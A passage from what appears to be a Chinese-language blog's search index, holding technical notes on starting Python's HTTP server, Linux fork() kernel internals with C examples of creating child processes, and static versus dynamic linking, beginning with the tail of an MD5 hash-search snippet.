hashlib.md5(v) == </span><br><span class="line">dest = <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(v)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python SimpleHTTPServer</title>
      <link href="/tool-python-http-server/"/>
      <url>/tool-python-http-server/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录一下如何启动Python的SimpleHTTPServer。</p><p>Python2:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p>Python3:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fork</title>
      <link href="/note-binary-os-fork/"/>
      <url>/note-binary-os-fork/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></figure><p>程序包含位于内存的多个组成部分, 执行程序的过程将根据需要来访问这些内容, 包括文本段（text segment）、数据段（data segments）、栈（stack）和堆（heap）。文本段中存放CPU所执行的命令, 数据段存放进程操作的所有数据变量, 栈存放自动变量和函数数据, 堆存放动态内存分配情况数据。当进程被创建时, 子进程收到父进程的数据副本, <code>包括数据空间、堆、栈和进程描述符</code></p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>若成功调用一次则返回<strong>两次</strong>, <strong>子进程返回0, 父进程返回子进程ID</strong>；否则, 出错返回-1</p><h2 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h2><ol><li>为子进程分配新的 pid, 并通过父进程 PCB（task_struct）创建新的子进程 PCB</li><li>检查进程数是否达到上限（分别检查用户限制和系统限制）</li><li>拷贝所有的进程信息（打开的文件 / 信号处理 / 进程地址空间等）, 这里需要拷贝的选项由调用 do_fork() 时传入的参数 clone_flags 决定</li><li>用父进程的内核栈初始化子进程的内核栈, 设置子进程的返回值为 0（eax = 0）</li><li>设置新进程的状态（TASK_RUNNING / TASK_STOPPED）, 调整父子进程调度</li><li>父进程 fork 返回子进程的 pid</li></ol><h2 id="系统调用流程"><a href="#系统调用流程" class="headerlink" title="系统调用流程"></a>系统调用流程</h2><p>Linux 源码地址: <a href="https://elixir.bootlin.com/linux/latest/source/kernel/fork.c#L1385">fork.c</a></p><p><code>sys_fork -&gt; _do_fork(SIGCHLD, 0, 0, NULL, NULL, 0) -&gt; copy_process() -&gt; copy_mm(clone_flags, p)</code></p><h3 id="copy-mm"><a href="#copy-mm" class="headerlink" title="copy_mm"></a>copy_mm</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">copy_mm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> clone_flags, struct task_struct *tsk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>, *<span class="title">oldmm</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    oldmm = current-&gt;mm;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (clone_flags &amp; CLONE_VM) &#123;</span><br><span class="line">        mmget(oldmm);</span><br><span class="line">        mm = oldmm;</span><br><span class="line">        <span class="keyword">goto</span> good_mm;</span><br><span class="line">    &#125;</span><br><span class="line">    retval = -ENOMEM;</span><br><span class="line">    mm = dup_mm(tsk);</span><br><span class="line">    ...</span><br><span class="line">good_mm:</span><br><span class="line">    tsk-&gt;mm = mm;</span><br><span class="line">    tsk-&gt;active_mm = mm;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fail_nomem:</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>copy_mm 的流程为:</p><ol><li><p>创建 mm_struct* mm, oldmm 结构体指针(内存描述符)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">oldmm = current-&gt;mm; <span class="comment">// oldmm 初始化为父进程的 mm_struct</span></span><br></pre></td></tr></table></figure></li><li><p>如果 clone_flags 指定了 CLONE_VM, 对应的 clone() 系统调用创建线程, 则共享父进程的 mm 结构；</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmget(oldmm);</span><br><span class="line">mm = oldmm;</span><br></pre></td></tr></table></figure></li><li><p>否则属于创建进程需要调用 dup_mm, dup_mm 进而调用 dup_mmap 函数。</p></li></ol><h3 id="dup-mm"><a href="#dup-mm" class="headerlink" title="dup_mm"></a>dup_mm</h3><p>先给子进程分配了一个新的结构体, 然后调用 dup_mmap 拷贝父进程地址空间</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mm_struct *<span class="title">dup_mm</span><span class="params">(struct task_struct *tsk,                struct mm_struct *oldmm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    mm = allocate_mm();</span><br><span class="line">    ...</span><br><span class="line">    err = dup_mmap(mm, oldmm);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dup-mmap"><a href="#dup-mmap" class="headerlink" title="dup_mmap"></a>dup_mmap</h3><ol><li><p>先复制父进程每个 vm_area_struct 线性区描述符, 插入到子进程的线性区链表和红黑树中, vm_area_struct 结构如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> * <span class="title">vm_mm</span>;</span> <span class="comment">// 指向线性区所在的内存描述符</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start; <span class="comment">// 当前线性区起始地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end; <span class="comment">// 线性区尾地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">vm_next</span>;</span> <span class="comment">// 下一个线性区</span></span><br><span class="line">    <span class="keyword">pgprot_t</span> vm_page_prot; <span class="comment">// 线性区访问权限</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span> <span class="comment">// 用于红黑树搜索的节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>用 copy_page_range() 创建新的页表, 在新的 vm_area_struct 中链接并复制父进程的页表条目</p></li></ol><blockquote><p>Linux 从 2.6.11 开始采用四级分页模型, 分别是 pgd、pud、pmd、pte, 所以从 copy_page_range 一直调用到 copy_pte_range 都是拷贝相应的页表条目</p></blockquote><h3 id="copy-page-range"><a href="#copy-page-range" class="headerlink" title="copy_page_range"></a>copy_page_range</h3><ol><li>创建新的页表</li><li>复制父进程的页表来初始化子进程的新页表私有/可写的页（ VM_SHARED 标志关闭/ VM_MAYWRITE 标志打开）所对应的权限父子进程都设为只读, 以便于 Copy-on-write 机制处理。</li><li>其中调用的 copy_one_pte 函数</li></ol><h4 id="copy-one-pte"><a href="#copy-one-pte" class="headerlink" title="copy_one_pte"></a>copy_one_pte</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">copy_one_pte</span><span class="params">(struct mm_struct *dst_mm, struct mm_struct *src_mm,        <span class="keyword">pte_t</span> *dst_pte, <span class="keyword">pte_t</span> *src_pte, struct vm_area_struct *vma,        <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">int</span> *rss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags = vma-&gt;vm_flags;</span><br><span class="line">    <span class="keyword">pte_t</span> pte = *src_pte;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If it&#x27;s a COW mapping, write protect it both</span></span><br><span class="line"><span class="comment">     * in the parent and the child</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (is_cow_mapping(vm_flags)) &#123;</span><br><span class="line">        ptep_set_wrprotect(src_mm, addr, src_pte);</span><br><span class="line">        pte = pte_wrprotect(pte);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">out_set_pte:</span><br><span class="line">    set_pte_at(dst_mm, addr, dst_pte, pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码判断如果父进程的页支持写时复制, 就将父子进程的页都置为写保护, 清除 pte 的_PAGE_BIT_RW 标记。</p><p>接着新进程的线性区和页表复制完成, 返回至 copy_process()</p><h3 id="copy-process"><a href="#copy-process" class="headerlink" title="copy_process"></a>copy_process</h3><ul><li>调用 copy_thread() 用父进程的内核栈来初始化子进程的内核栈</li></ul><h3 id="copy-thread"><a href="#copy-thread" class="headerlink" title="copy_thread()"></a>copy_thread()</h3><ul><li><p>将 eax 的值强制设置为0 ( fork 系统调用的返回值 )</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">childregs-&gt;eax = <span class="number">0</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="sched-fork"><a href="#sched-fork" class="headerlink" title="sched_fork()"></a>sched_fork()</h3><ul><li>调用 sched_fork() 完成对新进程调度程序数据结构的初始化, 将新进程状态设为 TASK_RUNNING</li><li>为了公平起见, 父子进程共享父进程的时间片</li></ul><h3 id="返回-do-fork"><a href="#返回-do-fork" class="headerlink" title="返回 do_fork()"></a>返回 do_fork()</h3><p>进程创建完成, 返回至 do_fork()</p><ul><li>如果设置 CLONE_STOPPED, 就将子进程设置 TASK_STOPPED 状态并挂起；<br>否则调用 wake_up_new_task() 调整父子进程的调度参数；</li></ul><h4 id="wake-up-new-task"><a href="#wake-up-new-task" class="headerlink" title="wake_up_new_task()"></a>wake_up_new_task()</h4><ul><li>如果父子进程运行在同一个 cpu 上, 并且不能共享同一组页表 (CLONE_VM 位为 0), 就把子进程插入运行队列中的父进程之前；</li><li>如果子进程创建之后调用 exec 执行新程序, 就可以避免写时拷贝机制执行不必要的页面复制；</li><li>否则, 如果运行在不同的cpu上, 或父子共享同一组页表, 就将子进程插入运行队列的队尾。</li></ul><p>返回至 do_fork()</p><ul><li>返回子进程的 pid</li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="单子进程创建"><a href="#单子进程创建" class="headerlink" title="单子进程创建"></a>单子进程创建</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 单子进程创建 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tPrint</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * fmt, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from Parent Process, PID is %d.\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    pid = fork(); <span class="comment">//创建子进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">3</span>; ++k) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello from Child Process %d. %d times\n&quot;</span>, getpid(), k + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( pid != <span class="number">-1</span>) &#123;</span><br><span class="line">        tPrint(<span class="string">&quot;Parent process forked one child process--%d.\n&quot;</span>, pid);</span><br><span class="line">        tPrint(<span class="string">&quot;Parent process is waiting for child process to exit, \n&quot;</span>);</span><br><span class="line">        waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        tPrint(<span class="string">&quot;Child Process has exited.\n&quot;</span>);</span><br><span class="line">        tPrint(<span class="string">&quot;Parent process had exited.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tPrint(<span class="string">&quot;Everything was done without error.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对输出信息进行优化</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tPrint</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span> </span>&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tStruct</span>;</span></span><br><span class="line">    <span class="keyword">time_t</span> tSec;</span><br><span class="line">    tSec = time(<span class="literal">NULL</span>);</span><br><span class="line">    tStruct = localtime(&amp;tSec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d: %5d|&quot;</span>, tStruct-&gt;tm_hour, tStruct-&gt;tm_min, tStruct-&gt;tm_sec, getpid());</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vprintf</span>(fmt, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="http://yanxuan.nosdn.127.net/845385f3ccfbb0008b0cbc17d2f4dd23.png" alt="UTOOLS1584867714061.png"></p><h4 id="流程图分析"><a href="#流程图分析" class="headerlink" title="流程图分析"></a>流程图分析</h4><p><img src="http://yanxuan.nosdn.127.net/1f0b501b6552710213a963c871642e7d.png" alt="单进程.png"></p><h3 id="用循环创建两（多）个子进程"><a href="#用循环创建两（多）个子进程" class="headerlink" title="用循环创建两（多）个子进程"></a>用循环创建两（多）个子进程</h3><h4 id="代码1——预测错误"><a href="#代码1——预测错误" class="headerlink" title="代码1——预测错误"></a>代码1——预测错误</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 多进程创建 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tPrint</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * fmt, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from Parent Process, PID is %d.\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid != <span class="number">0</span> &amp;&amp; pid != <span class="number">-1</span>) &#123;</span><br><span class="line">            tPrint(<span class="string">&quot;Parent process forked one child process--%d.\n&quot;</span>, pid);</span><br><span class="line">            tPrint(<span class="string">&quot;Parent process is waiting for child process to exit, \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello from Child Process %d.\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( pid != <span class="number">-1</span>) &#123;</span><br><span class="line">        waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        tPrint(<span class="string">&quot;Child Process has exited.\n&quot;</span>);</span><br><span class="line">        tPrint(<span class="string">&quot;Parent Process has exited.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tPrint(<span class="string">&quot;Everything was done without error.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tPrint</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span> </span>&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tStruct</span>;</span></span><br><span class="line">    <span class="keyword">time_t</span> tSec;</span><br><span class="line">    tSec = time(<span class="literal">NULL</span>);</span><br><span class="line">    tStruct = localtime(&amp;tSec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d: %5d|&quot;</span>, tStruct-&gt;tm_hour, tStruct-&gt;tm_min, tStruct-&gt;tm_sec, getpid());</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vprintf</span>(fmt, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h5><p><img src="http://yanxuan.nosdn.127.net/a71615608d54ab11459979e4f5cf35ce.png" alt="UTOOLS1584869814528.png"></p><h5 id="分析错误原因"><a href="#分析错误原因" class="headerlink" title="分析错误原因"></a>分析错误原因</h5><p>看似只产生了两个子进程, 实际上产生了三个子进程。</p><p>fork() 函数是将父进程的数据副本进行复制, <code>包括数据空间、堆、栈和进程描述符</code>, 所以第一个子进程还在循环之中, 此时 <code>i = 0</code>, i++ 后 <code>再一次运行fork() 创建一个子进程</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PID</span><br><span class="line">2342(Parent) -&gt; 2343(Child1)</span><br><span class="line">2343(Child1) -&gt; 2344(Child3)</span><br><span class="line">2142(Parent) -&gt; 2145(Child2)</span><br></pre></td></tr></table></figure><h4 id="代码2"><a href="#代码2" class="headerlink" title="代码2"></a>代码2</h4><p>由于fork函数会返回两次, 在子进程中返回0值, 因此, 可以在循环中添加<code>if (pid == 0 || pid == -1) break;</code>则当第一个子进程创建后, 由于<code>pid == 0</code>则退出循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tPrint</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * fmt, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello from Parent Process, PID is %d.\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid != <span class="number">0</span> &amp;&amp; pid != <span class="number">-1</span>) &#123;</span><br><span class="line">            tPrint(<span class="string">&quot;Parent process forked one child process--%d.\n&quot;</span>, pid);</span><br><span class="line">            tPrint(<span class="string">&quot;Parent process is waiting for child process to exit, \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span> || pid == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello from Child Process %d.\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( pid != <span class="number">-1</span>) &#123;</span><br><span class="line">        waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        tPrint(<span class="string">&quot;Child Process has exited.\n&quot;</span>);</span><br><span class="line">        tPrint(<span class="string">&quot;Parent Process has exited.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        tPrint(<span class="string">&quot;Everything was done without error.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tPrint</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span> </span>&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tStruct</span>;</span></span><br><span class="line">    <span class="keyword">time_t</span> tSec;</span><br><span class="line">    tSec = time(<span class="literal">NULL</span>);</span><br><span class="line">    tStruct = localtime(&amp;tSec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d: %5d|&quot;</span>, tStruct-&gt;tm_hour, tStruct-&gt;tm_min, tStruct-&gt;tm_sec, getpid());</span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">vprintf</span>(fmt, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h5><p><img src="http://yanxuan.nosdn.127.net/6f13c15c15f1cb61a05a8cd0898dcc46.png" alt="UTOOLS1584869951772.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.debugger.wiki/article/html/1575213815323923">Linux 系统调用 —— fork 内核源码剖析</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dynamic and Static Link</title>
      <link href="/note-binary-dynamic-static-link/"/>
      <url>/note-binary-dynamic-static-link/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="库"><a href="#库" class="headerlink" title="库"></a>库</h2><p>库是写好的现有的, 成熟的, 可以复用的代码。现实中每个程序都要依赖很多基础的底层库, 不可能每个人的代码都从零开始, 因此库的存在意义非同寻常。</p><p>本质上来说库是一种可执行代码的二进制形式, 可以被操作系统载入内存执行。</p><p>库有两种:静态库（.a、.lib）和动态库（.so、.dll）。</p><p>windows上对应的是.lib .dll linux上对应的是.a .so</p><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>源文件（.h, .cpp等） =&gt; 预编译 =&gt; 编译 =&gt; 汇编 =&gt; 链接 =&gt; 可执行文件</p><p>而静态库、动态库区别来自<code>链接阶段</code>如何处理库从而链接成可执行文件, 分别称为静态链接和动态链接</p><h2 id="静态库"><a href="#静态库" class="headerlink" title="静态库"></a>静态库</h2><p> 在链接阶段, 会将汇编生成的目标文件.o与引用到的库一起链接打包到可执行文件中。因此对应的链接方式称为静态链接。</p><p> 特点:</p><ul><li><p>静态库对函数库的链接是在<code>编译阶段</code>完成的</p></li><li><p>程序在运行时与函数库再无关系, 移植方便</p></li><li><p>浪费空间和资源, 因为所有相关的目标文件与涉及到的函数库将被链接合成一个可执行文件</p></li></ul><p> 问题:</p><ul><li><p>空间浪费:如果静态库再内存中存在多份拷贝, 例如该静态库占用1内存, 有2000个程序运用了该静态库, 将占用将近2GB内存</p></li><li><p>对程序更新、部署和发布带来麻烦: 如果静态库liba.lib 更新将导致它的应用程序都需重新编译、发布给用户。对用户而言可能是一个很小的改动, 却导致整个程序重新下载, 全量更新</p></li></ul><h2 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h2><p> 动态库在程序编译时并不会被连接到目标代码中, 而是在程序运行是才被载入。不同的应用程序如果调用相同的库, 那么在内存里只需要有一份该共享库的实例, 规避了空间浪费问题。动态库在程序运行是才被载入, 也解决了静态库对程序的更新、部署和发布页会带来麻烦。用户只需要更新动态库即可, 增量更新。</p><p>特点:</p><ul><li><p>动态库把对一些库函数的链接载入推迟到程序运行的时期</p></li><li><p>可以实现进程之间的资源共享（因此动态库也称为共享库）</p></li><li><p>程序升级变得简单</p></li><li><p>可以真正做到链接载入完全由程序员在程序代码中控制（显示调用）</p></li></ul><p>问题:</p><ul><li><p>“DLL地狱”: 如果较新的版本不能正确地向后兼容, 则不兼容的更新库将破坏依赖于库以前版本的可执行文件</p></li><li><p>程序及其使用的库可以作为软件包进行认证（例如, 关于正确性, 文档要求或性能）, 但是, 如果可以更换组件, 则不能。（这也反对在关键系统中自动进行操作系统更新；在两种情况下, 操作系统和库均构成合格环境的一部分）</p></li></ul><p>参考:</p><p><a href="https://www.zhihu.com/question/20484931">Linux 中的动态链接库和静态链接库是干什么的？</a></p><p><a href="https://en.wikipedia.org/wiki/Linker_(computing)#Dynamic_linking">Linker (computing)</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
